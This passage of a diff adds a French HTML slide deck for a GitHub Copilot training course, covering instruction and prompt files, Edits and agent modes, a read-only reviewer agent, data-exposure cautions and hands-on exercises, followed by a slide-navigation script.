+exécute ce code chez toutes les personnes qui ouvrent la fiche.
+C'est la faille XSS, la plus répandue du web.
+
+Ce fichier **ne calcule rien**. S'il te faut un total, un tri ou un filtre,
+il manque une fonction dans statistiques.js ou depot.js : c'est là
+qu'il faut l'écrire.
+
+Prévois toujours l'état vide : une liste sans résultat affiche un message
+utile, jamais un tableau nu.</pre>
+<div class="note">Le champ <code class="inline">applyTo</code> accepte un motif glob : <code class="inline">"tests/**/*.js"</code>, <code class="inline">"**/*.sql"</code>. On donne la bonne règle au bon endroit, sans alourdir les instructions générales.</div>
+<div class="amorce">&#128172; Quel dossier de votre projet mériterait sa propre règle absolue ?</div>
+</section>
+<section class="slide slide-code">
+<div class="code-tag">Code · MiniCRM</div>
+<h2 class="slide-title code-title">Un fichier de prompt réutilisable</h2>
+<div class="file-path">codebase_minicrm/.github/prompts/completer-fonction.prompt.md</div>
+<pre class="code">---
+mode: agent
+description: Complète une fonction laissée en TODO, en partant des tests.
+---
+
+Complète la fonction `${input:fonction:nom de la fonction}`
+dans `js/statistiques.js`.
+
+Procède dans cet ordre :
+
+1. Lis le bloc JSDoc : il énonce les règles, une par une.
+2. Lis les tests qui la concernent dans tests/statistiques.test.js :
+   ils sont la spécification exacte, plus précise que la JSDoc.
+3. Écris l'implémentation. Fonction PURE : aucun effet de bord,
+   pas de modification du tableau reçu en paramètre.
+4. Lance `node run-tests.js` et vérifie que les 90 tests passent.
+5. Résume en trois lignes ce que tu as écrit et pourquoi.
+
+Contraintes : français, deux espaces d'indentation, aucune dépendance,
+aucune modification des tests.</pre>
+<div class="note">S'invoque avec <code class="inline">/completer-fonction</code>. Le champ <code class="inline">mode</code> choisit l'exécution : <code class="inline">ask</code> (répond), <code class="inline">edit</code> (modifie), <code class="inline">agent</code> (fait tout, y compris lancer les tests).</div>
+<div class="amorce">&#128172; Quelle demande retapez-vous, mot pour mot, plusieurs fois par semaine ?</div>
+</section>
+<section class="slide">
+<div class="slide-tag">Refactoriser</div>
+<h2 class="slide-title">La demande qui marche, et celle qui échoue</h2>
+<div class="two-col"><div class="col"><h4>Ce qui échoue</h4><div class="note" style="max-width:100%;border-left-color:#C1443B;background:#FDF0EF;">« Améliore ce fichier. »</div><ul class="points"><li>Il renomme des choses au passage</li><li>Il ajoute une abstraction inutile</li><li>Il supprime un cas que vous aviez traité exprès</li><li>Le diff fait 200 lignes, vous ne le relisez pas</li></ul></div><div class="col"><h4>Ce qui marche</h4><div class="note" style="max-width:100%;">« Extrais la validation de l'e-mail dans une fonction dédiée. Ne change aucun nom public, ne touche pas aux tests, et dis-moi ensuite quelles lignes ont bougé. »</div><ul class="points"><li>Une seule intention</li><li>Des invariants explicites</li><li>Un diff court, donc relu</li><li>Un résumé des changements, pour vérifier</li></ul></div></div>
+<div class="note">C'est la même règle qu'au jour 2 : un <b>prompt de modification</b> dit ce qui change <b>et</b> ce qui ne doit pas changer. La seconde moitié est celle que tout le monde oublie.</div>
+<div class="amorce">&#128172; Combien de vos demandes commencent par « améliore » ou « optimise » ?</div>
+</section>
+<section class="slide slide-divider">
+<div class="section-num">4</div>
+<div class="section-tag">Module 4</div>
+<h2 class="section-title">Edits et mode agent</h2>
+<p class="section-sub">Plusieurs fichiers d'un coup. C'est puissant, et c'est exactement là qu'il faut ralentir.</p>
+</section>
+<section class="slide">
+<div class="slide-tag">Edits</div>
+<h2 class="slide-title">Modifier plusieurs fichiers en une demande</h2>
+<ul class="points"><li><code class="inline">Ctrl+Shift+I</code> ouvre la vue Edits.</li><li><b>Ajoutez explicitement</b> les fichiers concernés au contexte. Ne comptez pas sur la devinette : elle rate un fichier sur trois.</li><li>Décrivez la tâche, pas les étapes. « Ajoute le champ téléphone » plutôt que « ouvre modele.js, ajoute une ligne, puis… ».</li><li>Le résultat arrive en <b>diff, fichier par fichier</b>. On accepte ou on refuse chacun séparément.</li><li>Refuser un fichier et garder les autres est parfaitement normal — et c'est souvent la bonne décision.</li></ul>
+<div class="note">Le mode Edits est le bon compromis : plus large que le chat en ligne, mais vous gardez la main fichier par fichier. Pour une tâche de moins de cinq fichiers, préférez-le au mode agent.</div>
+<div class="amorce">&#128172; Quelle modification de votre projet touche exactement trois fichiers ?</div>
+</section>
+<section class="slide">
+<div class="slide-tag">Mode agent</div>
+<h2 class="slide-title">Quand il travaille tout seul</h2>
+<ul class="points"><li>Il choisit lui-même les fichiers à lire et à modifier, lance des commandes, lit les erreurs et <b>recommence</b>.</li><li>Il vous demande l'autorisation avant chaque commande de terminal — lisez-les, ne validez pas en série.</li><li>Il s'arrête quand il pense avoir fini. « Il pense » : c'est vous qui décidez si c'est vrai.</li><li>Vous pouvez l'interrompre à tout moment sans perdre la conversation.</li></ul>
+<div class="warn">Le mode agent est <b>le seul</b> où une seule phrase peut produire deux cents lignes réparties dans six fichiers. Deux règles, sans exception : <b>travaillez sur une branche</b>, et <b>relisez le diff en entier</b> avant de valider.</div>
+<div class="note">La bonne demande en mode agent est une tâche <b>vérifiable</b> : « fais passer les tests de statistiques.test.js ». Il sait quand il a fini, et vous aussi.</div>
+<div class="amorce">&#128172; Comment saurez-vous qu'il a terminé, si vous ne pouvez pas le vérifier ?</div>
+</section>
+<section class="slide slide-code">
+<div class="code-tag">Personnaliser</div>
+<h2 class="slide-title code-title">Un agent maison, pour un rôle précis</h2>
+<div class="file-path">.github/agents/relecteur.agent.md</div>
+<pre class="code">---
+name: relecteur
+description: Relit une modification avec l'oeil d'un développeur senior.
+tools: ['codebase', 'search', 'problems']
+---
+
+Tu relis le code d'un collègue sur MiniCRM. Les règles du projet sont dans
+.github/copilot-instructions.md. Lis-les en premier.
+
+Tu cherches, dans cet ordre :
+
+1. une RÈGLE MÉTIER cassée — le seul défaut qui ne fait pas planter le
+   programme mais donne un chiffre faux ;
+2. une valeur non échappée qui entre dans du HTML ;
+3. une fonction placée dans la mauvaise couche ;
+4. un cas limite non testé ;
+5. un commentaire qui répète le code.
+
+Tu réponds par une liste, du plus grave au moins grave : fichier et ligne,
+le problème en une phrase, la correction en une phrase.
+
+Tu ne modifies aucun fichier : tu relis, tu ne corriges pas.</pre>
+<div class="note">Deux détails qui font tout : la liste <code class="inline">tools</code> ne contient <b>aucun outil d'écriture</b>, et la dernière phrase le répète en toutes lettres. Un relecteur qui corrige lui-même ne relit plus rien.</div>
+<div class="amorce">&#128172; Quel rôle de votre équipe mériterait son propre agent ?</div>
+</section>
+<section class="slide">
+<div class="slide-tag">Choisir</div>
+<h2 class="slide-title">Plusieurs modèles, un sélecteur</h2>
+<h3 class="subtitle">Le sélecteur en bas du chat permet de changer de modèle en cours de conversation. Le bon réflexe n'est pas de prendre le plus puissant : c'est de prendre le moins cher qui fait le travail.</h3>
+<table class="cmp"><tr><th>Le besoin</th><th>Ce qu'il faut</th></tr><tr><td>Compléter une fonction dont le contrat est écrit</td><td>Le modèle rapide par défaut. Le plus gros n'apportera rien.</td></tr><tr><td>Comprendre un fichier hérité de 800 lignes</td><td>Un modèle à grande fenêtre de contexte.</td></tr><tr><td>Choisir entre deux approches d'architecture</td><td>Un modèle de raisonnement — et un humain qui tranche.</td></tr><tr><td>Faire passer une suite de tests en mode agent</td><td>Un modèle de raisonnement : la boucle essai-erreur en profite vraiment.</td></tr><tr><td>Reformuler un commentaire</td><td>N'importe lequel. Ce choix n'a aucune importance ici.</td></tr></table>
+<div class="note">Sur un forfait à l'usage, le choix du modèle est le premier levier de coût — exactement comme au jour 2, avec le même rapport de 1 à 40.</div>
+<div class="amorce">&#128172; Sur quelle proportion de vos demandes le plus gros modèle change-t-il réellement la réponse ?</div>
+</section>
+<section class="slide">
+<div class="slide-tag">Sécurité</div>
+<h2 class="slide-title">Ce qui part réellement de votre machine</h2>
+<ul class="points"><li><b>La complétion</b> envoie le fichier courant et des extraits des fichiers ouverts.</li><li><b>Le chat</b> envoie ce que vous référencez, plus les instructions du dépôt.</li><li><b><code class="inline">#codebase</code></b> envoie des extraits trouvés par recherche dans tout le dépôt.</li><li><b>Le mode agent</b> envoie tout ce qu'il décide de lire — vous ne choisissez pas.</li><li>Le filtrage du code public correspondant et l'exclusion de fichiers se règlent dans les paramètres de l'organisation, pas dans votre éditeur.</li></ul>
+<div class="warn">Vérifiez avec votre direction informatique ce qui est autorisé <b>avant</b> de pointer un assistant sur un dépôt client. Cette question relève du contrat, pas de la technique — et elle ne se rattrape pas après coup.</div>
+<div class="note">Réflexe simple et suffisant dans 90 % des cas : un <code class="inline">.env</code> ou un fichier de secrets ne doit jamais être ouvert dans un onglet pendant que vous travaillez avec un assistant.</div>
+<div class="amorce">&#128172; Savez-vous ce que votre organisation a autorisé, exactement ?</div>
+</section>
+<section class="slide">
+<div class="slide-tag">Au-delà de l'éditeur</div>
+<h2 class="slide-title">Copilot dans le reste de la chaîne</h2>
+<div class="two-col"><div class="col"><h4>Sur GitHub</h4><ul class="points"><li>Revue de code automatique sur les PR</li><li>Assignation d'une issue à Copilot</li><li>Chat sur un dépôt, depuis le navigateur</li><li>Résumé de PR et de discussions</li></ul></div><div class="col"><h4>En terminal — <code class="inline">copilot</code></h4><ul class="points"><li><code class="inline">/model</code> — changer de modèle</li><li><code class="inline">/add-dir</code> — élargir l'accès aux fichiers</li><li><code class="inline">/mcp</code> — brancher vos serveurs</li><li><code class="inline">/delegate</code> — faire ouvrir une PR</li><li><code class="inline">/share</code> — partager la session</li></ul></div></div>
+<div class="note">Le récapitulatif complet — <b>50 commandes</b>, raccourcis, références et options — est dans <code class="inline">Recap_50_commandes_GitHub_Copilot.html</code>.</div>
+<div class="amorce">&#128172; À quel moment de votre chaîne une relecture automatique serait-elle la plus utile ?</div>
+</section>
+<section class="slide slide-divider">
+<div class="section-num">5</div>
+<div class="section-tag">Module 5</div>
+<h2 class="section-title">Pratique</h2>
+<p class="section-sub">Trois exercices sur MiniCRM. Le guide pas à pas est dans Exercices_guides_GitHub_Copilot.html.</p>
+</section>
+<section class="slide slide-exercice">
+<div class="exo-tag">&#128295; Travaux pratiques</div>
+<h2 class="exo-title">Compléter par la complétion</h2>
+<div class="exo-duree">50 minutes · seul · &lt;code class="inline"&gt;js/statistiques.js&lt;/code&gt;</div>
+<ol class="exo-steps"><li>Ouvrez le dossier dans VS Code et lancez <code class="inline">node run-tests.js</code> : <b>8 tests en échec</b>. C'est votre cahier des charges.</li><li>Ouvrez <code class="inline">js/statistiques.js</code> et lisez les quatre <code class="inline">// TODO</code>.</li><li><b>Sans rien ouvrir d'autre</b>, placez le curseur dans <code class="inline">meilleursClients()</code>. Notez la suggestion.</li><li>Ouvrez maintenant <code class="inline">tests/statistiques.test.js</code> dans un second onglet, revenez, redemandez (<code class="inline">Alt+\</code>). <b>Notez la différence.</b></li><li>Acceptez avec <code class="inline">Ctrl+→</code>, mot à mot, en relisant.</li><li>Faites <code class="inline">contactsDormants()</code> avec <code class="inline">Ctrl+I</code> sur la fonction.</li><li><code class="inline">node run-tests.js</code> après chaque fonction.</li></ol>
+<div class="exo-livrable"><b>Livrable :</b> deux fonctions complétées, les tests correspondants au vert, et une phrase écrite sur ce qu'a changé l'ouverture du fichier de tests.</div>
+
+</section>
+<section class="slide slide-exercice">
+<div class="exo-tag">&#128295; Travaux pratiques</div>
+<h2 class="exo-title">Edits, agent, et relecture</h2>
+<div class="exo-duree">1 h 10 · en binôme</div>
+<ol class="exo-steps"><li><code class="inline">Ctrl+Shift+I</code> : demandez <code class="inline">parMois()</code> <b>et</b> son branchement dans <code class="inline">js/app.js</code>. Deux fichiers, une demande.</li><li>Acceptez fichier par fichier. Refusez-en un volontairement, pour voir ce qui se passe.</li><li>Passez en <b>mode agent</b> et demandez : « fais passer tous les tests de <code class="inline">tests/statistiques.test.js</code> ».</li><li>Laissez-le travailler <b>sans intervenir</b>. Chronométrez. Puis lisez le diff <b>en entier</b>.</li><li>Cherchez trois choses : a-t-il modifié un test ? A-t-il ajouté une dépendance ? A-t-il touché un fichier hors sujet ?</li><li>Dans le chat : <code class="inline">/relire</code> (le fichier de prompt du projet).</li><li>Comparez ce que dit la relecture à ce que vous aviez vu vous-même.</li></ol>
+<div class="exo-livrable"><b>Livrable :</b> les 90 tests au vert, le tableau de bord complet dans <code class="inline">index.html</code>, et la liste écrite de ce que l'agent a fait et que vous n'aviez pas demandé.</div>
+
+</section>
+<section class="slide slide-exercice">
+<div class="exo-tag">&#128295; Travaux pratiques</div>
+<h2 class="exo-title">Industrialiser pour l'équipe</h2>
+<div class="exo-duree">50 minutes · en binôme</div>
+<ol class="exo-steps"><li>Modifiez <code class="inline">.github/copilot-instructions.md</code> : ajoutez une règle de style bien à vous (par exemple : « pas de fonction fléchée en dehors des callbacks »).</li><li>Demandez une nouvelle fonction. La règle est-elle respectée ? Sinon, reformulez-la : une instruction floue est ignorée.</li><li>Créez <code class="inline">.github/instructions/depot.instructions.md</code>, avec <code class="inline">applyTo: "js/depot.js"</code> et une règle absolue propre à ce fichier.</li><li>Écrivez un fichier de prompt <code class="inline">.github/prompts/ajouter-champ.prompt.md</code> qui ajoute un champ au modèle : validation, test, formulaire, affichage.</li><li>Lancez-le avec <code class="inline">/ajouter-champ</code> pour ajouter un champ <b>téléphone</b>.</li><li>Relisez tout, lancez les tests, faites un commit.</li></ol>
+<div class="exo-livrable"><b>Livrable :</b> trois fichiers de configuration écrits, un champ téléphone opérationnel de bout en bout, et les tests au vert.</div>
+
+</section>
+<section class="slide">
+<div class="slide-tag">Pièges</div>
+<h2 class="slide-title">Les dix erreurs des premières semaines</h2>
+<div class="two-col"><div class="col"><h4>Sur la complétion</h4><ul class="points"><li>Appuyer sur <code class="inline">Tab</code> sans lire</li><li>Travailler avec un seul onglet ouvert</li><li>Ne jamais essayer <code class="inline">Alt+]</code></li><li>Écrire le code avant la JSDoc</li><li>Ignorer le mot-à-mot <code class="inline">Ctrl+→</code></li></ul></div><div class="col"><h4>Sur le reste</h4><ul class="points"><li>Ne pas écrire d'instructions de dépôt</li><li>Poser une question sans <code class="inline">#</code> ni sélection</li><li>Accepter les tests générés sans les lire</li><li>Lancer le mode agent sur la branche principale</li><li>Valider un diff de 200 lignes en diagonale</li></ul></div></div>
+<div class="warn">Le meilleur indicateur de maturité n'est pas la vitesse de production : c'est le <b>taux de refus</b>. Un développeur qui n'a rien refusé de la journée n'a rien relu.</div>
+<div class="amorce">&#128172; Combien de suggestions avez-vous refusées aujourd'hui ?</div>
+</section>
+<section class="slide">
+<div class="slide-tag">Mesurer</div>
+<h2 class="slide-title">Le gain réel, et comment le savoir</h2>
+<ul class="points"><li><b>Ce qui augmente vraiment :</b> la vitesse d'écriture du code qu'on sait déjà écrire, la couverture de tests, la qualité des messages de commit, la vitesse de reprise d'un fichier inconnu.</li><li><b>Ce qui n'augmente pas :</b> la qualité des décisions d'architecture, la connaissance de votre métier, la pertinence de vos priorités.</li><li><b>Ce qui peut baisser :</b> votre attention en relecture, et votre mémoire des API que vous n'écrivez plus vous-même.</li><li><b>Le seul indicateur qui compte :</b> le nombre de retours en arrière et d'incidents en production — pas le nombre de lignes produites.</li></ul>
+<div class="warn">Se donner un indicateur de lignes produites, c'est se garantir de produire des lignes. Une équipe qui mesure la vitesse obtiendra de la vitesse, y compris quand ce n'est pas ce dont elle a besoin.</div>
+<div class="amorce">&#128172; Qu'est-ce que votre équipe mesure aujourd'hui, et qu'est-ce que ça encourage ?</div>
+</section>
+<section class="slide">
+<div class="slide-tag">Bilan</div>
+<h2 class="slide-title">Ce que vous emportez</h2>
+<div class="two-col"><div class="col"><h4>Les gestes</h4><ul class="points"><li>La JSDoc avant le code</li><li>Ouvrir les bons onglets avant de commencer</li><li><code class="inline">Ctrl+→</code> plutôt que <code class="inline">Tab</code></li><li>Sélectionner avant de demander</li><li>Relire le diff en entier, toujours</li></ul></div><div class="col"><h4>Les fichiers</h4><ul class="points"><li><code class="inline">.github/copilot-instructions.md</code></li><li><code class="inline">.github/instructions/*.instructions.md</code></li><li><code class="inline">.github/prompts/*.prompt.md</code></li><li><code class="inline">.vscode/settings.json</code></li><li><code class="inline">.vscode/mcp.json</code></li></ul></div></div>
+<div class="note">Les cinq fichiers de droite se versionnent. Écrits une fois, ils profitent à toute l'équipe — y compris à celles et ceux qui n'ouvriront jamais la documentation.</div>
+<div class="amorce">&#128172; Lequel de ces cinq fichiers créerez-vous demain matin ?</div>
+</section>
+<section class="slide slide-cta">
+<h2>À garder à portée de main</h2>
+<p>Trois fichiers vous accompagnent après la formation.</p>
+<div class="cta-links"><a href="2_Recap_50_commandes.html">Les 50 commandes</a><a href="3_Exercices_guides.html">Les exercices guidés</a><a href="4_Fiche_participant.html">Votre fiche à remplir</a></div>
+<p class="src">Formation animée par <b>Kuate Joël Parfait</b> — Digital House Company · hello@dhcompany.pro</p>
+</section>
+</div>
+
+<script>
+
+let current = 0;
+const slides = document.querySelectorAll('.slide');
+const progressBar = document.getElementById('progress');
+
+// Chaque slide de contenu porte deja sa propre question d'amorce (.amorce).
+// Le mecanisme ci-dessous ne s'applique qu'aux slides qui n'en auraient pas :
+// il garantit qu'aucune slide ne reste sans question a poser au groupe.
+const relanceTemplates = [
+  t => `\u{1F4AC} A demander au groupe : qu'est-ce que « ${t} » change dans votre facon de coder ?`,
+  t => `\u{1F4AC} Tour de table eclair : qui a deja rencontre ce cas dans un projet ?`,
+  t => `\u{1F4AC} Une minute de reflexion : sur une echelle de 1 a 5, ce point est-il maitrise chez vous ?`,
+  t => `\u{1F4AC} Question flash : quel est le principal risque si l'on ignore ce point ?`,
+  t => `\u{1F4AC} Discussion : sur quel projet en cours pourriez-vous appliquer cela des demain ?`,
+  t => `\u{1F4AC} A chaud : qu'est-ce qui vous surprend le plus dans « ${t} » ?`,
+];
+slides.forEach((s, i) => {
+  if (s.classList.contains('slide-question') || s.classList.contains('slide-cover')) return;
+  if (s.querySelector('.amorce')) return;
+  const titleEl = s.querySelector('.slide-title, .section-title, .an-title, .demo-title, .exo-title, .code-title, .quote-text');
+  const title = titleEl ? titleEl.textContent.trim() : '';
+  const div = document.createElement('div');
+  div.className = 'mini-relance';
+  div.textContent = relanceTemplates[i % relanceTemplates.length](title);
+  s.appendChild(div);
+});
+
+function goTo(n){
+  slides[current].classList.remove('active');
+  current = Math.max(0, Math.min(n, slides.length - 1));
+  slides[current].classList.add('active');
+  progressBar.style.width = ((current + 1) / slides.length * 100) + '%';
+  document.getElementById('counter').textContent = (current + 1) + ' / ' + slides.length;
+  slides[current].scrollTop = 0;
+  try { location.hash = 's' + (current + 1); } catch (e) {}
+}
+document.getElementById('prevBtn').addEventListener('click', ()=>goTo(current-1));
+document.getElementById('nextBtn').addEventListener('click', ()=>goTo(current+1));
+document.getElementById('pdfBtn').addEventListener('click', ()=>window.print());
+document.addEventListener('keydown', e => {
+  if (e.target && /^(INPUT|TEXTAREA|SELECT)$/.test(e.target.tagName)) return;
+  if (e.key === 'ArrowRight' || e.key === 'ArrowDown' || e.key === ' ') goTo(current + 1);
+  if (e.key === 'ArrowLeft' || e.key === 'ArrowUp') goTo(current - 1);
+  if (e.key === 'Home') goTo(0);
+  if (e.key === 'End') goTo(slides.length - 1);
+  if (e.key === 'p' || e.key === 'P') window.print();
+});
+let xStart = null;
+document.addEventListener('touchstart', e => { xStart = e.changedTouches[0].screenX; });
+document.addEventListener('touchend', e => {
+  const diff = xStart - e.changedTouches[0].screenX;
+  if (Math.abs(diff) > 50) diff > 0 ? goTo(current + 1) : goTo(current - 1);
+});
+const depart = parseInt((location.hash || '').replace('#s', ''), 10);
+goTo(Number.isFinite(depart) && depart > 0 ? depart - 1 : 0);
+
+</script>
+</body>
+</html>
